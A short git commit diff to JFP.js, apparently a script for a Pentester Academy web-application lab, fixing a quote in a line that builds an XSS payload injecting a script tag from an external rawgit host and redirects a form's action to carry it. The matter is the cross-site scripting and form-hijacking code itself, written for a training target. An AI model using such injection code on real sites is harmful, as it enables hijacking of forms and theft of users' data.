bf59dd20f60159f764558bcae728524b2f681bea
Charles Harner <charner93@gmail.com>
2018-01-22 09:03:14 -0600

    Update JFP.js

--- JFP.js
+++ JFP.js
@@ -1,5 +1,5 @@
 xss = '&url=<script src%3D\"https%3A%2F%2Frawgit.com%2Fcharner93%2Fscripts%2Fmaster%2FJFP.js\"><%2Fscript>';
-document.forms[0].action = "http://pentesteracademylab.appspot.com/lab/webapp/jfp/3? + xss;
+document.forms[0].action = "http://pentesteracademylab.appspot.com/lab/webapp/jfp/3?" + xss;
 function onFormSubmit()
 {
 	getForm = document.getElementsByTagName("form");
